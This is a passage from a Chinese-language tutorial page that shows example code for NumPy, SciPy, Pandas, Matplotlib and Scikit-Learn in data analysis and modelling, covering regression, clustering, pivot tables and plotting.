计算矩阵 A 与单位矩阵 I 的加法</span><br>result = A + I<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A + I:\n&quot;</span>, result)<br><br><span class="hljs-comment"># 计算 A 的逆矩阵</span><br>A_inv = np.linalg.inv(A)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A 的逆矩阵：\n&quot;</span>, A_inv)<br></code></pre></td></tr></table></figure><h3 id="1-2-广播机制与数组运算"><a href="#1-2-广播机制与数组运算" class="headerlink" title="1.2 广播机制与数组运算"></a><strong>1.2 广播机制与数组运算</strong></h3><p>在数据分析中，我们经常需要对数组进行逐元素操作，<strong>NumPy</strong> 的广播机制使得这一过程更加高效。</p><h4 id="实例：加权平均"><a href="#实例：加权平均" class="headerlink" title="实例：加权平均"></a><strong>实例：加权平均</strong></h4><p>假设你有一个评分数组和一个对应的权重数组，你可以使用广播机制来计算加权平均：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 评分数组和权重数组</span><br><span class="hljs-attribute">scores</span> = np.array([<span class="hljs-number">80</span>, <span class="hljs-number">90</span>, <span class="hljs-number">70</span>, <span class="hljs-number">85</span>, <span class="hljs-number">95</span>])<br><span class="hljs-attribute">weights</span> = np.array([<span class="hljs-number">0</span>.<span class="hljs-number">1</span>, <span class="hljs-number">0</span>.<span class="hljs-number">2</span>, <span class="hljs-number">0</span>.<span class="hljs-number">3</span>, <span class="hljs-number">0</span>.<span class="hljs-number">2</span>, <span class="hljs-number">0</span>.<span class="hljs-number">2</span>])<br><br><span class="hljs-comment"># 使用广播机制计算加权平均</span><br><span class="hljs-attribute">weighted_average</span> = np.sum(scores * weights)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;加权平均成绩:&quot;</span>, weighted_average)<br></code></pre></td></tr></table></figure><hr><h2 id="2-SciPy：科学计算库"><a href="#2-SciPy：科学计算库" class="headerlink" title="2. SciPy：科学计算库"></a><strong>2. SciPy：科学计算库</strong></h2><h3 id="2-1-优化：最小化问题"><a href="#2-1-优化：最小化问题" class="headerlink" title="2.1 优化：最小化问题"></a><strong>2.1 优化：最小化问题</strong></h3><p>在实际工程中，常常需要通过优化算法来找到最优解。<strong>SciPy</strong> 提供了强大的优化工具。以下是一个最小化问题的示例。</p><h4 id="实例：最小化损失函数"><a href="#实例：最小化损失函数" class="headerlink" title="实例：最小化损失函数"></a><strong>实例：最小化损失函数</strong></h4><p>假设你在做回归分析，需要通过最小化均方误差来拟合一条直线。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> scipy import optimize<br><span class="hljs-attribute">import</span> numpy as np<br><br><span class="hljs-comment"># 定义损失函数：均方误差 (MSE)</span><br><span class="hljs-attribute">def</span> loss(params, x, y):<br>    <span class="hljs-attribute">m</span>, b = params<br>    <span class="hljs-attribute">return</span> np.sum((y - (m * x + b))**<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># 示例数据</span><br><span class="hljs-attribute">x_data</span> = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])<br><span class="hljs-attribute">y_data</span> = np.array([<span class="hljs-number">2</span>.<span class="hljs-number">3</span>, <span class="hljs-number">2</span>.<span class="hljs-number">9</span>, <span class="hljs-number">3</span>.<span class="hljs-number">1</span>, <span class="hljs-number">3</span>.<span class="hljs-number">9</span>, <span class="hljs-number">4</span>.<span class="hljs-number">7</span>])<br><br><span class="hljs-comment"># 使用 optimize.minimize 寻找最优的 m 和 b</span><br><span class="hljs-attribute">result</span> = optimize.minimize(loss,<span class="hljs-meta"> [1, 0], args=(x_data, y_data))</span><br><span class="hljs-meta">m_opt, b_opt = result.x</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">print(f&quot;最优参数：m=&#123;m_opt&#125;, b=&#123;b_opt&#125;&quot;)</span><br></code></pre></td></tr></table></figure><h3 id="2-2-插值：数据补全"><a href="#2-2-插值：数据补全" class="headerlink" title="2.2 插值：数据补全"></a><strong>2.2 插值：数据补全</strong></h3><p>在实际应用中，数据可能存在缺失，<strong>SciPy</strong> 提供了插值工具来填补缺失数据。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> scipy import interpolate<br><br><span class="hljs-comment"># 原始数据</span><br><span class="hljs-attribute">x</span> = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])<br><span class="hljs-attribute">y</span> = np.array([<span class="hljs-number">2</span>.<span class="hljs-number">5</span>, <span class="hljs-number">3</span>.<span class="hljs-number">5</span>, np.nan, <span class="hljs-number">5</span>.<span class="hljs-number">5</span>, <span class="hljs-number">6</span>.<span class="hljs-number">5</span>])<br><br><span class="hljs-comment"># 使用插值方法填补缺失值</span><br><span class="hljs-attribute">f</span> = interpolate.interp1d(x[~np.isnan(y)], y[~np.isnan(y)], kind=&#x27;linear&#x27;, fill_value=&#x27;extrapolate&#x27;)<br><span class="hljs-attribute">y_filled</span> = f(x)<br><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;填补后的数据：&quot;</span>, y_filled)<br></code></pre></td></tr></table></figure><hr><h2 id="3-Pandas：数据处理和分析"><a href="#3-Pandas：数据处理和分析" class="headerlink" title="3. Pandas：数据处理和分析"></a><strong>3. Pandas：数据处理和分析</strong></h2><h3 id="3-1-数据清理与转换"><a href="#3-1-数据清理与转换" class="headerlink" title="3.1 数据清理与转换"></a><strong>3.1 数据清理与转换</strong></h3><p>在数据预处理过程中，数据清洗和转换是非常重要的步骤。使用 <strong>Pandas</strong> 你可以轻松处理缺失值、重复数据等问题。</p><h4 id="实例：去除缺失值并处理重复数据"><a href="#实例：去除缺失值并处理重复数据" class="headerlink" title="实例：去除缺失值并处理重复数据"></a><strong>实例：去除缺失值并处理重复数据</strong></h4><p>假设你有一个包含缺失值和重复数据的 DataFrame，你可以使用 Pandas 来清理数据。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br><span class="hljs-meta"># 创建带有缺失值和重复数据的 DataFrame</span><br><span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Name</span>&#x27;: [&#x27;<span class="hljs-type">Alice</span>&#x27;, &#x27;<span class="hljs-type">Bob</span>&#x27;, &#x27;<span class="hljs-type">Charlie</span>&#x27;, &#x27;<span class="hljs-type">Alice</span>&#x27;, <span class="hljs-type">None</span>],</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Age</span>&#x27;: [25, 30, <span class="hljs-type">None</span>, 25, 35],</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Score</span>&#x27;: [85, 90, 78, 85, <span class="hljs-type">None</span>]</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-title">df</span> = pd.<span class="hljs-type">DataFrame</span>(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br><br><span class="hljs-meta"># 去除重复数据</span><br><span class="hljs-title">df_cleaned</span> = df.drop_duplicates()<br><br><span class="hljs-meta"># 删除包含缺失值的行</span><br><span class="hljs-title">df_cleaned</span> = df_cleaned.dropna()<br><br><span class="hljs-title">print</span>(<span class="hljs-string">&quot;清理后的数据：\n&quot;</span>, df_cleaned)<br></code></pre></td></tr></table></figure><h3 id="3-2-数据聚合与分组"><a href="#3-2-数据聚合与分组" class="headerlink" title="3.2 数据聚合与分组"></a><strong>3.2 数据聚合与分组</strong></h3><p>Pandas 提供了强大的分组功能，适用于各种聚合任务。</p><h4 id="实例：按年龄分组并计算平均分"><a href="#实例：按年龄分组并计算平均分" class="headerlink" title="实例：按年龄分组并计算平均分"></a><strong>实例：按年龄分组并计算平均分</strong></h4><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-meta"># 创建示例 DataFrame</span><br><span class="hljs-class"><span class="hljs-keyword">data</span> = &#123;</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Name</span>&#x27;: [&#x27;<span class="hljs-type">Alice</span>&#x27;, &#x27;<span class="hljs-type">Bob</span>&#x27;, &#x27;<span class="hljs-type">Charlie</span>&#x27;, &#x27;<span class="hljs-type">David</span>&#x27;, &#x27;<span class="hljs-type">Edward</span>&#x27;],</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Age</span>&#x27;: [25, 30, 25, 30, 25],</span><br><span class="hljs-class">    &#x27;<span class="hljs-type">Score</span>&#x27;: [85, 90, 78, 88, 92]</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-title">df</span> = pd.<span class="hljs-type">DataFrame</span>(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br><br><span class="hljs-meta"># 按年龄分组，并计算每组的平均分</span><br><span class="hljs-title">grouped</span> = df.groupby(&#x27;<span class="hljs-type">Age&#x27;</span>).mean()<br><br><span class="hljs-title">print</span>(<span class="hljs-string">&quot;按年龄分组计算平均分：\n&quot;</span>, grouped)<br></code></pre></td></tr></table></figure><h3 id="3-3-数据透视表"><a href="#3-3-数据透视表" class="headerlink" title="3.3 数据透视表"></a><strong>3.3 数据透视表</strong></h3><p>在多维数据分析中，使用 <strong>Pandas</strong> 的数据透视表（pivot_table）可以快速进行复杂的数据分析。</p><h4 id="实例：创建数据透视表"><a href="#实例：创建数据透视表" class="headerlink" title="实例：创建数据透视表"></a><strong>实例：创建数据透视表</strong></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 创建示例 DataFrame</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;Name&#x27;</span>: [<span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-string">&#x27;Charlie&#x27;</span>, <span class="hljs-string">&#x27;David&#x27;</span>, <span class="hljs-string">&#x27;Edward&#x27;</span>],<br>    <span class="hljs-string">&#x27;Department&#x27;</span>: [<span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;Engineering&#x27;</span>, <span class="hljs-string">&#x27;HR&#x27;</span>, <span class="hljs-string">&#x27;Engineering&#x27;</span>, <span class="hljs-string">&#x27;Marketing&#x27;</span>],<br>    <span class="hljs-string">&#x27;Salary&#x27;</span>: [50000, 60000, 55000, 70000, 45000],<br>    <span class="hljs-string">&#x27;Experience&#x27;</span>: [2, 5, 3, 6, 1]<br>&#125;<br>df = pd.DataFrame(data)<br><br><span class="hljs-comment"># 创建数据透视表：按部门分组，计算薪资和经验的平均值</span><br>pivot_table = df.pivot_table(values=[<span class="hljs-string">&#x27;Salary&#x27;</span>, <span class="hljs-string">&#x27;Experience&#x27;</span>], <span class="hljs-attribute">index</span>=<span class="hljs-string">&#x27;Department&#x27;</span>, <span class="hljs-attribute">aggfunc</span>=<span class="hljs-string">&#x27;mean&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据透视表：\n&quot;</span>, pivot_table)<br></code></pre></td></tr></table></figure><hr><h2 id="4-Matplotlib：数据可视化"><a href="#4-Matplotlib：数据可视化" class="headerlink" title="4. Matplotlib：数据可视化"></a><strong>4. Matplotlib：数据可视化</strong></h2><h3 id="4-1-绘制多个子图"><a href="#4-1-绘制多个子图" class="headerlink" title="4.1 绘制多个子图"></a><strong>4.1 绘制多个子图</strong></h3><p>在实际分析中，我们通常需要绘制多个子图来展示不同的数据关系。<strong>Matplotlib</strong> 提供了非常方便的接口来创建子图。</p><h4 id="实例：创建多个子图"><a href="#实例：创建多个子图" class="headerlink" title="实例：创建多个子图"></a><strong>实例：创建多个子图</strong></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import matplotlib.pyplot as plt<br>import numpy as np<br><br><span class="hljs-comment"># 创建数据</span><br>x = np.linspace(0, 10, 100)<br>y1 = np.sin(x)<br>y2 = np.cos(x)<br><br><span class="hljs-comment"># 创建一个 1x2 的子图</span><br>fig, ax = plt.subplots(1, 2, figsize=(10, 4))<br><br><span class="hljs-comment"># 绘制第一个子图：sin(x)</span><br>ax[0].plot(x, y1, <span class="hljs-attribute">label</span>=<span class="hljs-string">&#x27;sin(x)&#x27;</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">&#x27;r&#x27;</span>)<br>ax[0].set_title(<span class="hljs-string">&#x27;Sine Function&#x27;</span>)<br>ax[0].legend()<br><br><span class="hljs-comment"># 绘制第二个子图：cos(x)</span><br>ax[1].plot(x, y2, <span class="hljs-attribute">label</span>=<span class="hljs-string">&#x27;cos(x)&#x27;</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">&#x27;b&#x27;</span>)<br>ax[1].set_title(<span class="hljs-string">&#x27;Cosine Function&#x27;</span>)<br>ax[1].legend()<br><br>plt.tight_layout()<br>plt.show()<br></code></pre></td></tr></table></figure><h3 id="4-2-3D-可视化"><a href="#4-2-3D-可视化" class="headerlink" title="4.2 3D 可视化"></a><strong>4.2 3D 可视化</strong></h3><p>如果数据是三维的，<strong>Matplotlib</strong> 提供了 3D 图形支持来进行可视化。</p><h4 id="实例：3D-曲面图"><a href="#实例：3D-曲面图" class="headerlink" title="实例：3D 曲面图"></a><strong>实例：3D 曲面图</strong></h4><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gml">from mpl_toolkits.mplot3d import Axes3D<br><br># 创建数据<br><span class="hljs-variable language_">x</span> = np.linspace(<span class="hljs-number">-5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">100</span>)<br><span class="hljs-variable language_">y</span> = np.linspace(<span class="hljs-number">-5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">100</span>)<br><span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span> = np.meshgrid(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>)<br>z = np.<span class="hljs-built_in">sin</span>(np.<span class="hljs-built_in">sqrt</span>(<span class="hljs-variable language_">x</span>**<span class="hljs-number">2</span> + <span class="hljs-variable language_">y</span>**<span class="hljs-number">2</span>))<br><br># 创建 <span class="hljs-number">3</span>D 图<br>fig = plt.figure()<br>ax = fig.add_subplot(<span class="hljs-number">111</span>, projection=<span class="hljs-string">&#x27;3d&#x27;</span>)<br>ax.plot_surface(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>, z, cmap=<span class="hljs-string">&#x27;viridis&#x27;</span>)<br><br>ax.set_title(<span class="hljs-string">&#x27;3D Surface Plot&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><hr><h2 id="5-Scikit-Learn：机器学习库"><a href="#5-Scikit-Learn：机器学习库" class="headerlink" title="5. Scikit-Learn：机器学习库"></a><strong>5. Scikit-Learn：机器学习库</strong></h2><h3 id="5-1-线性回归"><a href="#5-1-线性回归" class="headerlink" title="5.1 线性回归"></a><strong>5.1 线性回归</strong></h3><p><strong>Scikit-Learn</strong> 提供了许多经典机器学习算法。在实际应用中，我们常用线性回归来预测连续值。</p><h4 id="实例：线性回归"><a href="#实例：线性回归" class="headerlink" title="实例：线性回归"></a><strong>实例：线性回归</strong></h4><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> <span class="hljs-type">LinearRegression</span><br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> mean_squared_error<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># 创建示例数据</span><br>X = np.<span class="hljs-type">array</span>([[<span class="hljs-number">1</span>], [<span class="hljs-number">2</span>], [<span class="hljs-number">3</span>], [<span class="hljs-number">4</span>], [<span class="hljs-number">5</span>]])<br>y = np.<span class="hljs-type">array</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])<br><br><span class="hljs-comment"># 数据拆</span><br></code></pre></td></tr></table></figure><h2 id="5-Scikit-Learn：机器学习库（续）"><a href="#5-Scikit-Learn：机器学习库（续）" class="headerlink" title="5. Scikit-Learn：机器学习库（续）"></a><strong>5. Scikit-Learn：机器学习库（续）</strong></h2><h3 id="5-1-线性回归（续）"><a href="#5-1-线性回归（续）" class="headerlink" title="5.1 线性回归（续）"></a><strong>5.1 线性回归（续）</strong></h3><p>线性回归是一个简单且广泛使用的算法，在很多实际应用中被用来进行预测。以下是一个基于 Scikit-Learn 的线性回归实例。</p><h4 id="实例：线性回归预测"><a href="#实例：线性回归预测" class="headerlink" title="实例：线性回归预测"></a><strong>实例：线性回归预测</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LinearRegression<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> mean_squared_error<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># 创建示例数据</span><br>X = np.array([[<span class="hljs-number">1</span>], [<span class="hljs-number">2</span>], [<span class="hljs-number">3</span>], [<span class="hljs-number">4</span>], [<span class="hljs-number">5</span>]])  <span class="hljs-comment"># 特征：X</span><br>y = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])  <span class="hljs-comment"># 标签：y</span><br><br><span class="hljs-comment"># 划分训练集和测试集</span><br>X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># 创建并训练线性回归模型</span><br>model = LinearRegression()<br>model.fit(X_train, y_train)<br><br><span class="hljs-comment"># 用测试集进行预测</span><br>y_pred = model.predict(X_test)<br><br><span class="hljs-comment"># 输出预测结果与真实值</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;预测结果：&quot;</span>, y_pred)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;真实值：&quot;</span>, y_test)<br><br><span class="hljs-comment"># 计算均方误差</span><br>mse = mean_squared_error(y_test, y_pred)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;均方误差：<span class="hljs-subst">&#123;mse&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>说明</strong>：</p><ul><li><code>train_test_split</code> 用于将数据拆分成训练集和测试集。</li><li><code>LinearRegression</code> 用于建立回归模型。</li><li><code>mean_squared_error</code> 用于评估模型的效果。</li></ul><h3 id="5-2-分类：逻辑回归（Logistic-Regression）"><a href="#5-2-分类：逻辑回归（Logistic-Regression）" class="headerlink" title="5.2 分类：逻辑回归（Logistic Regression）"></a><strong>5.2 分类：逻辑回归（Logistic Regression）</strong></h3><p>逻辑回归广泛应用于二分类问题，如疾病预测、金融欺诈检测等。</p><h4 id="实例：逻辑回归分类"><a href="#实例：逻辑回归分类" class="headerlink" title="实例：逻辑回归分类"></a><strong>实例：逻辑回归分类</strong></h4><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> <span class="hljs-type">LogisticRegression</span><br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score<br><br><span class="hljs-comment"># 创建示例数据</span><br>X = np.<span class="hljs-type">array</span>([[<span class="hljs-number">1</span>], [<span class="hljs-number">2</span>], [<span class="hljs-number">3</span>], [<span class="hljs-number">4</span>], [<span class="hljs-number">5</span>], [<span class="hljs-number">6</span>], [<span class="hljs-number">7</span>], [<span class="hljs-number">8</span>], [<span class="hljs-number">9</span>], [<span class="hljs-number">10</span>]])  <span class="hljs-comment"># 特征：X</span><br>y = np.<span class="hljs-type">array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>])  <span class="hljs-comment"># 标签：y，0 和 1 的二分类</span><br><br><span class="hljs-comment"># 划分训练集和测试集</span><br><span class="hljs-type">X_train</span>, <span class="hljs-type">X_test</span>, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>, random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># 创建并训练逻辑回归模型</span><br>model = <span class="hljs-type">LogisticRegression</span>()<br>model.fit(<span class="hljs-type">X_train</span>, y_train)<br><br><span class="hljs-comment"># 用测试集进行预测</span><br>y_pred = model.predict(<span class="hljs-type">X_test</span>)<br><br><span class="hljs-comment"># 输出准确率</span><br>accuracy = accuracy_score(y_test, y_pred)<br>print(<span class="hljs-string">f&quot;分类准确率：&#123;accuracy&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>说明</strong>：</p><ul><li><code>LogisticRegression</code> 用于二分类问题。</li><li><code>accuracy_score</code> 用于计算分类模型的准确度。</li></ul><h3 id="5-3-聚类：KMeans-聚类"><a href="#5-3-聚类：KMeans-聚类" class="headerlink" title="5.3 聚类：KMeans 聚类"></a><strong>5.3 聚类：KMeans 聚类</strong></h3><p>KMeans 是一种常用的无监督学习算法，用于将数据划分成不同的类别。</p><h4 id="实例：KMeans-聚类"><a href="#实例：KMeans-聚类" class="headerlink" title="实例：KMeans 聚类"></a><strong>实例：KMeans 聚类</strong></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> sklearn.cluster import KMeans<br>import numpy as np<br>import matplotlib.pyplot as plt<br><br><span class="hljs-comment"># 创建示例数据：两个特征</span><br>X = np.array([[1, 2], [2, 3], [3, 4], [10, 11], [11, 12], [12, 13]])<br><br><span class="hljs-comment"># 创建 KMeans 模型，设置为 2 个聚类中心</span><br>kmeans = KMeans(<span class="hljs-attribute">n_clusters</span>=2, <span class="hljs-attribute">random_state</span>=42)<br><br><span class="hljs-comment"># 训练模型</span><br>kmeans.fit(X)<br><br><span class="hljs-comment"># 预测每个点的聚类标签</span><br>labels = kmeans.predict(X)<br><br><span class="hljs-comment"># 打印聚类中心</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;聚类中心：&quot;</span>, kmeans.cluster_centers_)<br><br><span class="hljs-comment"># 可视化聚类结果</span><br>plt.scatter(X[:, 0], X[:, 1], <span class="hljs-attribute">c</span>=labels, <span class="hljs-attribute">cmap</span>=<span class="hljs-string">&#x27;viridis&#x27;</span>)<br>plt.scatter(kmeans.cluster_centers_[:, 0], kmeans.cluster_centers_[:, 1], <span class="hljs-attribute">marker</span>=<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">&#x27;red&#x27;</span>, <span class="hljs-attribute">s</span>=200)<br>plt.title(<span class="hljs-string">&quot;KMeans 聚类&quot;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p><strong>说明</strong>：</p><ul><li><code>KMeans</code> 用于进行聚类分析。</li><li><code>cluster_centers_</code> 存储聚类中心的坐标。</li><li>使用 <code>matplotlib</code> 可视化聚类结果。</li></ul><hr><h2 id="总结：如何将-Python-库应用于数学建模和数据分析"><a href="#总结：如何将-Python-库应用于数学建模和数据分析" class="headerlink" title="总结：如何将 Python 库应用于数学建模和数据分析"></a><strong>总结：如何将 Python 库应用于数学建模和数据分析</strong></h2><p>结合之前的示例和应用，可以看到 <strong>NumPy</strong>、<strong>SciPy</strong>、<strong>Pandas</strong>、<strong>Matplotlib</strong> 和 <strong>Scikit-Learn</strong> 在数学建模和数据分析中的应用非常广泛。这些库为我们提供了强大的数值计算、数据处理、统计分析、机器学习和数据可视化的工具。</p><ol><li><strong>NumPy</strong>：用于基础的数组操作和矩阵运算，在优化问题、线性代数、数值计算中扮演重要角色。</li><li><strong>SciPy</strong>：提供了高级的数学计算功能，如优化、积分、插值和高级线性代数，可以解决复杂的数学建模问题。</li><li><strong>Pandas</strong>：用于数据预处理，特别是处理结构化数据（如 CSV、Excel 文件等）。它还具有强大的数据清理、聚合和透视表功能，非常适合做数据分析。</li><li><strong>Matplotlib</strong>：帮助我们可视化数据，支持各种类型的图表，包括 2D 和 3D 图形，非常适合用于分析报告和展示数据。</li><li><strong>Scikit-Learn</strong>：为机器学习提供了一整套算法和工具，适用于分类、回归、聚类等任务，可以帮助我们进行建模和预测。</li></ol><h3 id="实际应用中的典型任务"><a 